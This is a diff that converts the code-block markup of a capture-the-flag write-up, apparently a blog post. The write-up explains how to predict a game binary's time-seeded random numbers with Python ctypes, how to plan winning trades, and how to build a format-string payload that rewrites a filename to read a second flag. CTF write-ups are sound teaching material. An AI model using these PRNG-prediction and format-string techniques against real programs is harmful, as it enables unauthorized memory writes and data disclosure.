@@ -53,7 +53,7 @@ Now, `moneygame-patched` can use used locally without the annoying screen clear.
 
 With the help of Python's ctypes, generating random numbers on our end is trivial:
 
-{% highlight python %}
+```python
 from ctypes import CDLL
 libc = CDLL('libc-2.19.so')
 
@@ -62,11 +62,11 @@ now = int(floor(time.time()))
 libc.srand(now)
 
 random_num = libc.rand()
-{% endhighlight %}
+```
 
 From here, we replicate the same function that creates the stocks from the binary in Python:
 
-{% highlight python %}
+```python
 def set_stocks():
     '''Create stocks based on current srand'''
     for index in xrange(1, 4):
@@ -84,7 +84,7 @@ def set_stocks():
                 curr_stock = 15000
 
             stocks[index].append(curr_stock)
-{% endhighlight %}
+```
 
 Now that we have our three stock listings, we have to determine the optimal buy/sell path to success.
 
@@ -98,34 +98,34 @@ The quick and dirty method I used is described below:
 An example of the last step of this simple algorithm is below:
 
 The top three profit margins:
-{% highlight python %}
+```
 [4, 6, 100, '1'] Stock 1 from week 4 to 6 yields 100
 [7, 9, 80,  '3'] Stock 3 from week 7 to 9 yields 80
 [1, 5, 50,  '2'] Stock 2 from week 1 to 5 yields 100
-{% endhighlight %}
+```
 
 Starting with the most profitable, fill in our available actions:
-{% highlight python %}
+```
 [4, 6, 100, '1'] Stock 1 from week 4 to 6 yields 100
 
 Actions: ['', '', '', '', 'Buy stock1', 'Rest', 'Sell stock1', '', '', '']
-{% endhighlight %}
+```
 
 Second most profitable:
-{% highlight python %}
+```
 [7, 9, 80,  '3'] Stock 3 from week 7 to 9 yields 80
 
 Actions: ['', '', '', '', 'Buy stock1', 'Rest', 'Sell stock1', 'Buy stock3', 'Rest', 'Sell stock3']
-{% endhighlight %}
+```
 
 Our third most profitable overlaps and existing range i.e. the [4, 6, 100, '1']. In this case, fill as much as we can before the start of the existing range.
 Note: This is not optimal. Bigger improvements can be made, but are not necessary.
-{% highlight python %}
+```
 [1, 5, 50, '2']
 
 # Note: 1 - 5 overlaps into existing 4 - 6, Try to go as far as we can before selling.
 Actions: ['', 'Buy stock2', 'Rest', 'Sell stock2', 'Buy stock1', 'Rest', 'Sell stock1', 'Buy stock3', 'Rest', 'Sell stock3']
-{% endhighlight %}
+```
 
 Now that we have our optimal actions, we simulate these actions in order to determine if the actions result in a bank of $100k. We don't want to waste time with the server, if we know ahead of time that we can lose.
 
@@ -135,11 +135,11 @@ Once we determine that we can win, we simply throw our results at the server and
 
 There is a string format vulnerability in the name field of the high score after winning the game. After winning the game, the binary grabs the filename of the flag `flag1`, reads the contents of the file, and returns the contents to the user. We are given that the second flag is named `flag2`, so we can use the string format to simply change the filename from `flag1` to `flag2`. 
 
-{% highlight python %}
+```python
 # Located at offset 7 on the stack
 # 0x804a2b4 = 'flag1'
 # 0x804a2b8 = '1'
 # '2' == 50
 # Padding necessary -> 50 - 4 bytes of address = 46
 shellcode = p32(0x804a2b8) + '%46c%7$hhn'
-{% endhighlight %}
+```
